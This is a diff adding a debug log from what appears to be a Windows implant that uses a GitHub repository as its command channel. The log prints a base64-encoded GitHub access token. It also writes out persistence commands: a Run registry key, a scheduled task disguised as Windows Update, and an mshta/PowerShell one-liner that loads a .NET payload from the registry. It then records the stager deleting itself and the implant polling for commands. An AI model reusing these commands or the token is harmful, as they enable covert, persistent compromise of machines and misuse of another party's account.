@@ -1,0 +1,35 @@
+Fri Nov 12 22:39:21 2021. Initialisation of the log file.
+
+DEBUG: Fri Nov 12 22:39:21 2021: GithubLogin: hidemepls785
+DEBUG: Fri Nov 12 22:39:21 2021: GithubRepoName: furry-octo-parakeet
+DEBUG: Fri Nov 12 22:39:21 2021: Base64GihubAccessToken: Z2hwX2pqTjRZWjRpY1V4T29MYXB0SjJOTWtRaHRTTE5jTDN0NUhGZA==
+DEBUG: Fri Nov 12 22:39:21 2021: Rootkit Name: VetementPatronPreprod01
+DEBUG: Fri Nov 12 22:39:21 2021: Rootkit Registry Key: Sensors
+DEBUG: Fri Nov 12 22:39:21 2021: Schtasks Task Name: WindowsUpdatePolicies
+DEBUG: Fri Nov 12 22:39:21 2021: Run Registry Key Name: WindowsUpdate
+DEBUG: Fri Nov 12 22:39:21 2021: Admin Rights: 0
+DEBUG: Fri Nov 12 22:39:21 2021: Adding the actual location of the servant: C:\Windows\SysWOW64\svchost.exe
+DEBUG: Fri Nov 12 22:39:21 2021: The folder list for random folder is not empty. Its size is: 4012
+DEBUG: Fri Nov 12 22:39:21 2021: The random path choosed for this execution is: C:\Users\gilles\AppData\Roaming\Mozilla\Firefox\Profiles\o2spo4qg.default-release\features\{daa0943d-fc50-485b-9eae-fc34e8b710a0}
+DEBUG: Fri Nov 12 22:39:21 2021: Start of the method setRunRegistryCommand.
+DEBUG: Fri Nov 12 22:39:21 2021: Success to create the registry run key.
+DEBUG: Fri Nov 12 22:39:21 2021: Start of the method createSchTaskCommandLine. 
+DEBUG: Fri Nov 12 22:39:21 2021: This content will be written in the start up batch: @echo off
+mshta "javascript:close(new ActiveXObject('WScript.Shell').run('powershell \"[Reflection.Assembly]::Load([Microsoft.Win32.Registry]::CurrentUser.OpenSubKey(\\\"Software\\\\Microsoft\\\\Sensors\\\").GetValue($Null)).EntryPoint.Invoke(0,$Null)\"',0))"
+exit
+DEBUG: Fri Nov 12 22:39:21 2021: Start of the method writeFileWindowsApi.
+DEBUG: Fri Nov 12 22:39:21 2021: The content size that will be written: 264
+DEBUG: Fri Nov 12 22:39:21 2021: Success to write the content(number of bytes : 264) in the file : C:\Users\gilles\AppData\Roaming\WindowsUpdateGroupPolicies.bat
+DEBUG: Fri Nov 12 22:39:21 2021: This command will be played: schtasks /create /TR "'cmd /MIN /c C:\Users\gilles\AppData\Roaming\WindowsUpdateGroupPolicies.bat'" /TN WindowsUpdatePolicies /SC daily
+ERROR: Fri Nov 12 22:39:43 2021: The command for shtasks query did not work. Here is the command: schtasks /query /TN "WindowsUpdatePolicies" > "C:\Users\gilles\AppData\Roaming\Mozilla\Firefox\Profiles\o2spo4qg.default-release\features\{daa0943d-fc50-485b-9eae-fc34e8b710a0}\garbage.txt"
+DEBUG: Fri Nov 12 22:39:43 2021: End of the createSchTaskCommandLine method.
+DEBUG: Fri Nov 12 22:39:43 2021: The stager is still on the system. It will be deleted.
+DEBUG: Fri Nov 12 22:39:43 2021: Success to delete the stager
+DEBUG: Fri Nov 12 22:39:43 2021: Start of a new loop to get commands and treat them.
+DEBUG: Fri Nov 12 22:39:43 2021: Start of GithubCommunication::receiveInstructions
+DEBUG: Fri Nov 12 22:39:44 2021: Success to get the instance number of the current instance: rootkit_path1
+DEBUG: Fri Nov 12 22:39:44 2021: Success to check the commands with rootkit_path1
+DEBUG: Fri Nov 12 22:39:44 2021: No commands are given in the github repo.
+DEBUG: Fri Nov 12 22:39:44 2021: The receive method and the method to send the results return true, breaking the Servant Mission loop.
+DEBUG: Fri Nov 12 22:39:44 2021: This is the end of servant mission.
+DEBUG: Fri Nov 12 22:39:44 2021: Start of GithubCommunication::sendLogs
